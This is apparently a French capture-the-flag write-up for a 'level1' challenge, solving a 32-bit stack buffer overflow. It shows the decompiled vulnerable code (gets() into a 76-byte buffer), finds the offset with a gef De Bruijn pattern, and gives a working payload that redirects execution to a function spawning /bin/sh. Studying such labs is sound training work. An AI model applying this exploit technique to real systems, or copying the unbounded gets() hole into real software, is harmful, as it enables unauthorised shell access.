# level1 — overflow

overflow basique

    void run(void)
    {
      fwrite("Good... Wait what?\n", 1, 20, stdout);
      system("/bin/sh");
      return;
    }

    void main(void)
    {
      char local_50[76];

      gets(local_50);
      return;
    }

`gets()` sur un buffer de 76 octets, aucune limite de taille : ça écrase direct l'adresse de retour sur la stack.

**Trouver l'offset avec gef**

 Pattern De Bruijn, c'est une chaîne où chaque groupe de 4 caractères (psk binaire 32 bits) n'apparaît qu'une seule fois (`aaaabaaacaaad...`). Comme aucune fenêtre de 4 ne se répète, dès qu'un morceau atterrit dans EIP, il correspond forcément à une position unique dans la séquence pas d'ambiguïté comme avec des "AAAA" répétées partout. `pattern search` n'a qu'à chercher cette position pour donner l'offset exact.

Dans gdb, génère un pattern De Bruijn de 200 caractères (largement assez pour un buffer de 76) :

       gef> pattern create 200
       gef> quit
       echo -n "aaaabaaacaaad..." > pattern.txt
       gdb ./level1
       gef> run < pattern.txt

   Le programme crash, gef affiche le contexte (registres, stack, etc.) automatiquement.

gef va retrouver l'offset directement depuis la valeur d'EIP :

       gef> pattern search $eip

   Ça compare EIP au pattern envoyé et donne l'offset : 76.

**Trouver l'adresse de `run`**

    file level1
    level1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=0e589e091e2f9d4b2ae80ea342992222e0f231b2, not stripped

    binaire pas strip donc possible de retrouver addrss

    gef> p run
    $1 = {<text variable, no debug info>} 0x8048444 <run>

création du payload:

    (printf 'A%.0s' {1..76}; printf '\x44\x84\x04\x08') > /tmp/payload

injection: 

    cat /tmp/payload - | ./level1


